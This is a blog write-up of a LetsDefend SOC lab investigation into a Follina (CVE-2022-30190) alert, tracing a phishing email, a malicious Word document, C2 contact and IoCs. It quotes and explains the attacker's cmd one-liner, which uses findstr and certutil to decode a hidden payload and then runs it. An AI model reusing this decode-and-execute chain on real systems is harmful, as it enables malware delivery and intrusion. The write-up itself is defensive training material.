---
title: "SOC173 - Follina 0-Day Detected"

header:
  teaser: /assets/images/LetsDefend/SOC173/profile.jpg
  overlay_image: /assets/images/LetsDefend/SOC173/profile.jpg
  overlay_filter: 0.5

ribbon: Green
description: "SOC173 - Follina 0-Day Detected"
categories:
  - Challenges
  - SOC
  - LetsDefend
  - CTF
tags: 
  - Follina
  - SOC
  - LetsDefend
  - Challenges
  - CTF

toc: false
toc_sticky: false
toc_label: "On This Blog"
toc_icon: "biohazard"
classes: wide
last_modified_at: 
---
<span style="color: #909090">Category: SOC - LetsDefend - Follina </span>

| ![Follina](/assets/images/LetsDefend/SOC173/7.png) | 
|:--:| 
| *SOC173 - Follina 0-Day Detected* |


> **In this writeup, we will investigate the zero-day Microsoft vulnerability — Follina. For those who are not aware of what Follina is, this [link](https://www.huntress.com/blog/microsoft-office-remote-code-execution-follina-msdt-bug) provides a comprehensive overview of the vulnerability.**

| ![Screenshot For The Alert](/assets/images/LetsDefend/SOC173/1.png) | 
|:--:| 
| *Screenshot For The Alert* |

Metadata information of the event which triggered the SIEM alert:
-  You can see the case title is Microsoft Windows Support Diagnostic Tool (MSDT) Remote Code Execution Vulnerability, `CVE-2022–30190` which triggered the rule `SOC173 - Follina 0-Day Detected`
- For this alert, we see that a suspicious `msdt.exe` behaviour was detected on JonasPRD workstation.
- File name, file hash, file size, event time and source IP address are also the key indicator for alerting this event.
- Antivirus responded with `Allow`, which means it wasn’t remediated with AV.

---

<details>
  <summary>
    Microsoft Windows Support Diagnostic Tool (MSDT)
  </summary>
  <ul>
    <li>The Microsoft Windows Support Diagnostic Tool (MSDT) is a built-in troubleshooting utility in Windows operating systems. It is designed to help diagnose and resolve common system and software issues. MSDT provides a user-friendly interface that guides users through diagnostic scenarios and collects relevant information about the system's configuration and error conditions.</li>
    <li>When launched, MSDT prompts the user to select a specific diagnostic scenario based on the type of problem they are experiencing. It covers a wide range of troubleshooting areas, including hardware and device issues, networking problems, performance optimization, Windows updates, and more.</li>
    <li>Once a diagnostic scenario is selected, MSDT automatically runs a series of diagnostic tests and gathers system information, error logs, and other relevant data. It may prompt users to answer questions or perform specific actions during the diagnostic process. After collecting the necessary information, MSDT provides a summary report, along with recommendations and potential solutions to address the identified issues.</li>
    <li>MSDT can be accessed through various methods in different versions of Windows, such as searching for "Support Diagnostic Tool" in the Start menu, using the Windows Troubleshooting Control Panel, or running specific command-line options.</li>
    <li>Overall, the Microsoft Windows Support Diagnostic Tool (MSDT) aims to simplify the troubleshooting process by providing a guided approach and comprehensive diagnostics, helping users identify and resolve common system problems more effectively.</li>
  </ul>
</details>
----
<details>
  <summary>
    CVE-2022-30190
  </summary>
  <ul>
    <li>A remote code execution vulnerability exists when MSDT is called using the URL protocol from a calling application such as Word.</li> 
    <li>An attacker who successfully exploits this vulnerability can run arbitrary code with the privileges of the calling application.</li>
    <li>The attacker can then install programs, view, change, or delete data, or create new accounts in the context allowed by the user’s rights. </li>
    <li>Please see the <a href="https://msrc.microsoft.com/blog/2022/05/guidance-for-cve-2022-30190-microsoft-support-diagnostic-tool-vulnerability/">MSRC Blog</a> Entry for important information about steps you can take to protect your system from this vulnerability.</li>
  </ul>
</details>
-----

💡More information about CVE-2022-30190 [mitre](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-30190) - [cvedetails](https://www.cvedetails.com/cve/CVE-2022-30190/) - [rapid7](https://www.rapid7.com/db/vulnerabilities/msft-cve-2022-30190/) - [nvd](https://nvd.nist.gov/vuln/detail/cve-2022-30190) - [msrc](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2022-30190) - [attackerkb](https://attackerkb.com/topics/Z0pUwH0BFV/cve-2022-30190) 


---
## Let's get ready to investigate the alert..!

First the alert is triggerd when the user opened an Office document `05-2022-0438.doc` and spawned a process which executed `msdt.exe`

- For our first step, we can put the hash of the `05-2022-0438.doc` file in Virus Total to get a preliminary overview of whether the file is malicious or not and to see if there are any hits returned.

  ```html
  File Hash: 52945af1def85b171870b31fa4782e52
  ```

### Virus Total

| ![Screenshot For The Alert](/assets/images/LetsDefend/SOC173/2.png) | 
|:--:| 
| *<a href="https://www.virustotal.com/gui/file/4a24048f81afbe9fb62e7a6a49adbd1faf41f266b5f9feecdceb567aec096784/detection">05-2022-0438.doc</a> seems to be very malicious* |

<!-- <figure align="center">
  <img src="/assets/images/LetsDefend/SOC173/2.png" alt="Virustotal" style="width:1000px">
  <figcaption><a href="https://www.virustotal.com/gui/file/4a24048f81afbe9fb62e7a6a49adbd1faf41f266b5f9feecdceb567aec096784/detection">05-2022-0438.doc</a> seems to be very malicious</figcaption>
</figure> -->

After we submit the file hash in VirusTotal, there are total of 44 security vendors flagged this file as malicious with relation to `CVE-2022–30190`.

---

| ![Virustotal](/assets/images/LetsDefend/SOC173/3.png) | 
|:--:| 
| *<a href='https://www.virustotal.com/gui/file/4a24048f81afbe9fb62e7a6a49adbd1faf41f266b5f9feecdceb567aec096784/relations'>Relations</a>* |

<!-- <figure align="center">
  <img src="/assets/images/LetsDefend/SOC173/3.png" alt="Virustotal" style="width:1000px">
  <a href='https://www.virustotal.com/gui/file/4a24048f81afbe9fb62e7a6a49adbd1faf41f266b5f9feecdceb567aec096784/relations'>Relations</a>
</figure> -->


- We can see C2 Adresses, Contacted Domains and URLs relation are also the key indicator for malicious file.

---
### ANY.RUN

Next, we will simulate this artefact’s behaviour on compromised system by submitting it to `ANY.RUN`

| ![ANY.RUN](/assets/images/LetsDefend/SOC173/5.png) | 


<!-- 
<figure align="center">
  <img src="/assets/images/LetsDefend/SOC173/5.png" alt="ANY.RUN" style="width:1000px">
</figure> -->


We can see when opening the file there are **DNS Query** to `www.xmlformats.com` which is an **IoC domain** with the purpose of processing malicious **HTML file** which exploits **msdt.exe** as displayed at process list history.

💡To show more ANY.RUN behaviour analysis result [Click Here](https://app.any.run/tasks/d9c2d416-f97f-402f-9a2c-e22bba14037f/)

---
### Hybrid Analysis 

Next, we will simulate this artefact’s behaviour on compromised system by submitting it to `Hybrid Analysis`

| ![Hybrid](/assets/images/LetsDefend/SOC173/6.png) | 
|:--:| 
| *Hybrid Analysis* |

<!-- <figure align="center">
  <img src="/assets/images/LetsDefend/SOC173/6.png" alt="Hybrid" style="width:1000px">
</figure> -->

Hybrid Analysis also flagged this file as malicious with detection reference to VirusTotal.

💡To show more Hybrid Analysis result [Click Here](https://medium.com/@rrio/letsdefend-follina-0-day-detected-by-sagi-dimarzio-871dc1c684c1)

---

### Now the doc file confirmed as malicious☠️

we can proceed to investigate further for other anomalies on `Jonas’s workstation` or in the `log management` tab.

| ![Screenshot For The Alert](/assets/images/LetsDefend/SOC173/8.png) | 
|:--:| 
| *Terminal History* |

<!-- <figure align="center">
  <img src="/assets/images/LetsDefend/SOC173/8.png" alt="Virustotal" style="width:1000px">
  <figcaption>Terminal History</figcaption>
</figure> -->

```python
C:/windows/system32/cmd.exe /c cd C:/users/public/&&for /r %temp% %i in (05-2022-0438.rar) do copy %i 1.rar /y&&findstr TVNDRgAAAA 1.rar>1.t&&certutil -decode 1.t 1.c &&expand 1.c -F:* .&&rgb.exe
```

```python
C:/windows/system32/cmd.exe /c 
cd C:/users/public/&&
for /r %temp% %i in (05-2022-0438.rar) do copy %i 1.rar /y&&
findstr TVNDRgAAAA 1.rar>1.t&&
certutil -decode 1.t 1.c &&
expand 1.c -F:* .&&
rgb.exe
```
<details>
  <summary>
  Explain this command that the attacker run in Powershell
  </summary>
  <ul>
  <li><code style="color: yellow;">C:/windows/system32/cmd.exe</code>: Specifies the path to the Command Prompt executable. This is the program that will interpret and execute the subsequent command.</li>
  <li><code style="color: yellow;">/c</code>: This is an argument for the Command Prompt, indicating that the following command should be executed and then the Command Prompt should exit.</li>
  <li><code style="color: yellow;">cd C:/users/public/</code>: Changes the current directory to C:/users/public/.</li>
  <li><code style="color: yellow;">&&</code>: This is a command separator, used to run multiple commands sequentially in the same line.</li>
  <li><code style="color: yellow;">for /r %temp% %i in (05-2022-0438.rar) do copy %i 1.rar /y</code>: This is a for loop command that searches for the file 05-2022-0438.rar in the %temp% directory and its subdirectories. When found, it copies the file as 1.rar to the current directory, overwriting it if it already exists.</li>
  <li><code style="color: yellow;">findstr TVNDRgAAAA 1.rar>1.t</code>: Searches for the string TVNDRgAAAA in the file 1.rar and redirects the output to 1.t.</li>
  <li><code style="color: yellow;">certutil -decode 1.t 1.c</code>: Uses the certutil tool to decode the file 1.t and saves the output as 1.c.</li>
  <li><code style="color: yellow;">expand 1.c -F:* .</code>: Expands the file 1.c and its contents to the current directory.</li>
  <li><code style="color: yellow;">rgb.exe</code>: Executes the rgb.exe program.</li>
  </ul>
</details>

---

>If the attacker exploit the `msdt.exe` successfully, it means the malicious `05-2022-0438.doc` had successfully establish homing connection to malicious domain and processed the malicious HTML which contains `msdt command line` embedded with `PowerShell` syntax. 

---

### Now Let's looking for the Log Management.

| ![Log Management Interface](/assets/images/LetsDefend/SOC173/9.png) | 
|:--:| 
| *Log Management Interface* |

<!-- <figure align="center">
  <img src="/assets/images/LetsDefend/SOC173/9.png" alt="Log Management." style="width:1000px">
  <figcaption>Log Management Interface</figcaption>
</figure> -->

Go to log management and search for compromised host’s IP address `172.16.17.39` that use for malicious behaviour and look for outbound connection at `June 2, 03:20 PM` you will see several outbound connection at this time.

---

| ![Log Management Interface](/assets/images/LetsDefend/SOC173/10.png) | 
|:--:| 
| *Log Management Interface* |

<!-- <figure align="center">
  <img src="/assets/images/LetsDefend/SOC173/10.png" alt="Log Management." style="width:1000px">
</figure> -->

First entry is an outbound connection to domain `www.xmlformats.com` and the IP address is `141.105.65.149` that i can use it for IoCs.

---

### Contacted URLs (2)
- https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/
- https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html

### Contacted Domains (1)
- www.xmlformats.com

### Contacted IP addresses (1)
- 141.105.65.149

---

### Now Let's Know how the attacker gain access to the host..

| ![Process List](/assets/images/LetsDefend/SOC173/11.png) | 
|:--:| 
| *Process List* |

<!-- <figure align="center">
  <img src="/assets/images/LetsDefend/SOC173/11.png" alt="Process List" style="width:1000px">
</figure> -->

Let’s return to **Process List** to know how the attacker access the victim, Before `WINWORD.exe` and `msdt.exe` spawned, we can see the user was running `OUTLOOK.exe`.

Then let's check the **Email Secuirty** and filter search by the time `Jun, 02, 2022` 

| ![Process List](/assets/images/LetsDefend/SOC173/12.png) | 
|:--:| 
| *Email Secuirty* |

<!-- <figure align="center">
  <img src="/assets/images/LetsDefend/SOC173/12.png" alt="Email Secuirty" style="width:1000px">
</figure> -->

Let’s open this email:

| ![Process List](/assets/images/LetsDefend/SOC173/13.png) | 
|:--:| 
| *Mail Box* |

<!-- <figure align="center">
  <img src="/assets/images/LetsDefend/SOC173/13.png" alt="Email Secuirty" style="width:1000px">
</figure> -->

### Email Sender (1):
-  radiosputnik@ria.ru

📌This attached link is to download the `05-2022-0438.doc` file.


We have identified the primary point of entry for this incident. Emails originating from an external domain were discovered, containing a malicious document. The attacker managed to deceive the target by exploiting social engineering techniques successfully.

---
### Conclusion


- Upon thorough investigation, my conclusive analysis reveals that the adversary orchestrated a well-crafted scheme. It appears that the initial point of attack involved the adversary posing as radiosputnik@ria.ru and specifically targeting Jonas. The deceptive email, cleverly designed to mimic a legitimate interview invitation, succeeded in tricking Jonas into opening the attached malicious documents.

- These documents were intricately crafted to serve as droppers, establishing a covert connection to a Command and Control (C2) server located at xmlformats[.]com. Within the domain resided a malicious HTML file, meticulously designed to exploit vulnerabilities in the msdt format. Remarkably, the script within the HTML file was able to transfer seamlessly to the compromised host without detection or interruption from antivirus software.

- This astute maneuver by the adversary allowed them to gain a foothold within the compromised system, thereby posing a significant security threat. It serves as a stark reminder of the importance of remaining vigilant against such sophisticated cyber-attacks.

---
### Case Management

| ![Process List](/assets/images/LetsDefend/SOC173/14.png) | 
|:--:| 
| *Incident Details* |

<!-- <figure align="center">
  <img src="/assets/images/LetsDefend/SOC173/14.png" alt="Playbook" style="width:1000px">
</figure> -->

<details>
  <summary>
  Define Threat Indicator
  </summary>
  Unknown or unexpected services and applications configured to launch automatically on system boot
</details>


<details>
  <summary>
  Check if the malware is quarantined/cleaned
  </summary>
  Not Quarantined
</details>


<details>
  <summary>
  Analyze Malware
  </summary>
  Malicious
</details>

<details>
  <summary>
  Check If Someone Requested the C2
  </summary>
  Accessed
</details>

---

### Artifacts

| Field               | Value                                                                                |
|---------------------|--------------------------------------------------------------------------------------|
| &nbsp;Email Address | &nbsp;radiosputnik@ria.ru                                                            |
| &nbsp;Domain        | &nbsp;www.xmlformats.com                                                             |
| &nbsp;URL Address   | &nbsp;https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/             |
| &nbsp;URL Address   | &nbsp;https://www.xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.html |
| &nbsp;IP addresses  | &nbsp;141.105.65.149                                                                 |
| &nbsp;MD5 Hash      | &nbsp;52945af1def85b171870b31fa4782e52                                               |
| &nbsp;SHA256        | &nbsp;4a24048f81afbe9fb62e7a6a49adbd1faf41f266b5f9feecdceb567aec096784|
| &nbsp;Filename      | &nbsp;05-2022-0438.doc                                                               |


<!-- 📌 LetsDefend Official [Write-Up](/assets/files/LetsDeefend-Writeups/SOC173/follina_0day_detected.pdf) -->

---

Protect Your Digital Presence & Stay Cyber Safe 💙

Thanks🌸


